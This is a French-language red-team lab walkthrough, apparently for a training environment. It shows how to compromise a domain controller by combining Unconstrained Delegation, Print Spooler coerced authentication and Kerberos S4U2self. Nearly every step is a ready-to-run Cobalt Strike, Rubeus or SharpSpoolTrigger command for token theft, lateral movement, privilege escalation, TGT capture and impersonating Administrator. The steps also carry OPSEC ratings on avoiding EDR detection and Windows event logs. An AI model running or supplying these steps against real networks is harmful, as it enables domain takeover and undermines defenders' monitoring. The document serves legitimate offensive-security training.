# Lab — S4U2self  

>L'objectif est de présenter **S4U2self** à partir du TGT d'un compte ordinateur.

**Principe :** S4U2self permet à un service de demander un ticket pour *lui-même* au nom d'un utilisateur, sans posséder son TGT ni son mot de passe. Combiné à **Unconstrained Delegation** et à un déclencheur d'authentification forcée (`SpoolSample`), le scénario récupère le TGT du compte machine DC, puis utilise `krb_s4u /self` pour obtenir un service ticket `cifs` avec impersonation Domain Admin. Le TGT du compte machine DC seul ne suffit pas pour accéder aux fichiers : S4U2self permet d'obtenir le service ticket nécessaire.

===

## Énumération

1. Lancer Cobalt Strike et se connecter au team server.
2. Rechercher les ordinateurs avec **Unconstrained Delegation** (hors DC dans ce scénario) :

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

    > OPSEC-🟢SAFE — BOF exécuté dans le thread du Beacon, sans child process.

⚠️ Résultat attendu : `lon-ws-1$` — l'hôte disposant d'Unconstrained Delegation utilisé pour le pivoting.

3. Effectuer une impersonation de l'utilisateur `rsteel`, puis un Lateral Movement vers `lon-ws-1`.

===

## Lateral Movement vers lon-ws-1

Objectif : obtenir un Beacon sur `lon-ws-1`. SYSTEM n'est **pas** strictement nécessaire pour toutes les étapes : Rubeus monitor passe par `execute-assembly`. Cependant, `winrm64` donne un Beacon sous `rsteel` (pas SYSTEM). Les notes prévoient `getsystem`, puis `rev2self` avant Rubeus monitor (voir étape 1).

### Option A — steal_token (privilégié, OPSEC-🟢SAFE)

1. Sur le Beacon actuel, utiliser `ps` ou `process_browser` pour chercher un processus appartenant à `rsteel` :

    ```Beacon-nocolor
    ps
    ```

    Rechercher `cmd.exe` ou `mmc.exe` exécuté par `CONTOSO\rsteel`.

2. Récupérer le token :

    ```Beacon-nocolor
    steal_token <rsteel-pid>
    ```

    > OPSEC-🟢SAFE — duplication de token dans le thread Beacon, sans événement logon ni child process.

3. Configurer `spawnto` avant le jump :

    ```Beacon-nocolor
    ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    ```

    > OPSEC-🟠CAUTION — définit le processus temporaire utilisé par fork & run. `dllhost.exe` se confond avec l'activité d'un COM surrogate dans ce scénario.

4. Effectuer le jump vers lon-ws-1 :

    ```Beacon-nocolor
    jump winrm64 lon-ws-1 smb_custom
    ```

    > OPSEC-🟢SAFE — WinRM, sans modification de service ni écriture disque, et sans Event 7045 d'après ces notes.

5. Abandonner le token sur le Beacon source une fois le jump réussi :

    ```Beacon-nocolor
    rev2self
    ```

### Option B — make_token + kerberos_ticket_use (si aucun processus rsteel n'est visible)

1. Récupérer le TGT de `rsteel` depuis la session en cache :

    ```Beacon-nocolor
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    ```

    > OPSEC-🟠CAUTION — Appel à l'API Kerberos `LsaCallAuthenticationPackage`, sans lecture directe de la mémoire LSASS.

2. Enregistrer le TGT Base64 au format `.kirbi` sur **l'Attacker Desktop**, via PowerShell local et non le Beacon :

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[BASE64-TGT]"))
    ```

    > ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` nécessite un **chemin de fichier** ; fournir directement le Base64 provoque l'erreur `does not exist`.

3. Créer une session de logon temporaire et injecter le TGT :

    ```Beacon-nocolor
    make_token CONTOSO\rsteel FakePass
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    ```

    > OPSEC-🟠CAUTION — `make_token` génère l'Event 4648.

4. Effectuer le jump vers lon-ws-1 :

    ```Beacon-nocolor
    jump winrm64 lon-ws-1 smb_custom
    ```

5. Abandonner le token et purger les tickets du Beacon source :

    ```Beacon-nocolor
    rev2self
    kerberos_ticket_purge
    ```

### Depuis le nouveau Beacon lon-ws-1

```Beacon-nocolor
getuid
```

> ⚠️ Lab-confirmed (2026-04-19): `jump winrm64` donne une session sous `CONTOSO\rsteel` (pas SYSTEM) — WinRM injecte dans `wsmprovhost.exe` exécuté sous l'utilisateur authentifié. Le lab demande un contexte SYSTEM avant Rubeus monitor. Utiliser `getsystem` :

```Beacon-nocolor
getsystem
getuid    # confirm NT AUTHORITY\SYSTEM
```

> OPSEC-🟠CAUTION — `getsystem` utilise une impersonation par named pipe depuis un contexte administrateur.

===

## Exploitation

### Étape 1 — Démarrer Rubeus monitor sur lon-ws-1

Surveille l'arrivée des TGT via SSPI, sans lecture directe de la mémoire LSASS.

> ⚠️ Lab-confirmed (2026-04-19): `execute-assembly` **échoue avec « No .NET runtime found »** juste après `getsystem`. Le token d'impersonation obtenu par `getsystem` perturbe le processus hôte .NET de fork & run. Solution relevée : exécuter `rev2self`, puis lancer Rubeus monitor :

```Beacon-nocolor
rev2self
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

> OPSEC-🟠CAUTION — fork & run dans `dllhost.exe` (`spawnto` défini plus haut). La capture des tickets utilise les API Windows SSPI/Kerberos, sans accès direct à la mémoire LSASS. `/targetuser` filtre les résultats pour ne conserver que le compte machine DC.

> ⚠️ Après `rev2self`, le Beacon revient dans le contexte `rsteel` : c'est attendu. Rubeus monitor s'exécute dans un processus temporaire et capture les tickets indépendamment du contexte d'impersonation du Beacon.

---

### Étape 2 — Forcer une authentification de lon-dc-1 vers lon-ws-1

Déclenche une authentification du service Print Spooler de `lon-dc-1` via MS-RPRN vers `lon-ws-1`.

```Beacon-nocolor
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

> OPSEC-🟠CAUTION — fork & run. D'après les notes, génère un événement logon 4648 sur `lon-dc-1` et du trafic RPC MS-RPRN. Le service Print Spooler doit être actif sur le DC.

> ⚠️ Lab-confirmed (2026-04-19): SharpSpoolTrigger peut renvoyer `[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` (ERROR_INVALID_HANDLE) sur les deux tentatives. Malgré cette erreur, Rubeus monitor a **tout de même capturé le TGT du DC** — l'hôte en Unconstrained Delegation peut avoir déjà reçu ce TGT lors d'une authentification précédente du DC. Si Rubeus monitor affiche le TGT de `lon-dc-1$`, le lab peut continuer malgré l'erreur SpoolTrigger.

⚠️ La sortie de Rubeus monitor doit contenir le TGT de `LON-DC-1$`. Copier le ticket Base64 complet et le renseigner **directement dans la commande `krb_s4u`** ci-dessous. Aucune écriture de fichier n'est nécessaire à cette étape.

---

### Étape 3 — Obtenir un service ticket CIFS avec S4U2self

Le TGT du compte machine DC ne permet pas directement l'accès aux fichiers. Utiliser `krb_s4u /self` pour obtenir un service ticket `cifs` avec impersonation d'Administrator.

```Beacon-nocolor
krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` est un BOF exécuté dans le thread du Beacon, sans child process ni écriture sur disque.

> ⚠️ Lab-confirmed (2026-04-19): La commande a réussi dans le lab. La sortie confirme :
> - `[*] Building S4U2self request for: 'LON-DC-1$@CONTOSO.COM'`
> - `[+] S4U2self success!`
> - `[*] Substituting alternative service name 'cifs/lon-dc-1'`
> - `[*] Got a TGS for 'Administrator' to 'cifs@CONTOSO.COM'`

⚠️ `krb_s4u` renvoie un **nouveau service ticket** Base64, différent du TGT du DC. Copier ce nouveau Base64 pour l'enregistrer en `.kirbi` à l'étape 4.

```
Rubeus monitor output  →  base64 DC TGT       →  paste into krb_s4u
krb_s4u output         →  base64 cifs ticket  →  WriteAllBytes → .kirbi → kerberos_ticket_use
```

---

### Étape 4 — Enregistrer le service ticket sur l'Attacker Desktop

Exécuter depuis le client Cobalt Strike sur l'Attacker Desktop (PowerShell local, **pas** le Beacon) :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

> Le fichier `.kirbi` est écrit **uniquement sur l'Attacker Desktop**, sans toucher au disque cible. `kerberos_ticket_use` lit le fichier depuis le client Cobalt Strike et l'injecte via le canal C2.

> ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` requires a **file path** — fournir directement le Base64 brut provoque l'erreur `'C:\Tools\cobaltstrike\client\[base64...]' does not exist`. Enregistrer d'abord le fichier `.kirbi`, puis utiliser son chemin.

---

### Étape 5 — Injecter le ticket et accéder au partage

Revenir dans le Beacon de **`lon-ws-1`**, et non celui de `lon-dc-1`, accessible à distance avec le ticket :

```Beacon-nocolor
// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, preferred)
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$

// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)
make_token CONTOSO\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$
```

> OPSEC-🟢SAFE — `kerberos_ticket_use` injecte le ticket dans la session de logon courante. `make_token` est facultatif dans ce lab : le serveur distant valide le ticket Kerberos, plutôt que l'identité locale de la session.

⚠️ `ls \\lon-dc-1\c$` doit fonctionner. En cas de `ACCESS_DENIED`, vérifier :
- `getuid` — vérifier le token courant
- `run klist` — vérifier la présence du ticket `cifs/lon-dc-1` dans la session (note: `run klist` crée un child process, à réserver à une vérification ponctuelle)
- Le SPN de `krb_s4u` doit correspondre exactement à `cifs/lon-dc-1`

Terminer l'impersonation et purger les tickets après utilisation :

```Beacon-nocolor
rev2self
kerberos_ticket_purge
```

===

⚠️ Ce lab montre l'association de l'Unconstrained Delegation, de déclencheurs d'authentification et de S4U2self pour accéder au Domain Controller `lon-dc-1` — en obtenant un service ticket `cifs` depuis le TGT du compte machine, sans lecture directe de LSASS.

===

## Observations du lab (2026-04-19)

| Observation | Détail |
|---------|--------|
| `kerberos_ticket_use` rejects raw base64 | Passer directement le Base64 échoue : Cobalt Strike l'interprète comme un chemin et renvoie `does not exist`. Enregistrer d'abord le `.kirbi`. |
| `getsystem` breaks `execute-assembly` | Après `getsystem`, Rubeus monitor échoue : `No .NET runtime found`. Exécuter `rev2self` avant `execute-assembly`. Rubeus monitor fonctionne dans le contexte administrateur `rsteel`. |
| `jump winrm64` lands as rsteel | WinRM injecte dans `wsmprovhost.exe` sous l'utilisateur authentifié, et non SYSTEM. `getsystem` needed for SYSTEM context, but `rev2self` required before Rubeus. |
| SharpSpoolTrigger `status: 6` | `RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` = ERROR_INVALID_HANDLE. Les deux tentatives ont renvoyé cette erreur. Rubeus monitor a malgré tout récupéré le TGT du DC, déjà en cache après une authentification précédente. |
| `smb_custom` listener worked first attempt | Aucun retry nécessaire avec un nom de pipe personnalisé (contrairement au `TSVCPIPE-*` par défaut). |
| `krb_s4u /self` succeeded | LON-DC-1$ TGT → `cifs/lon-dc-1` service ticket for Administrator. Le déroulement de S4U2self a été confirmé de bout en bout. |
| EDR on lon-ws-1 | Elastic Endpoint, MsMpEng et Sysmon64 sont présents ; ce lab prévoit `spawnto` personnalisé et un SMB pipe dédié. |
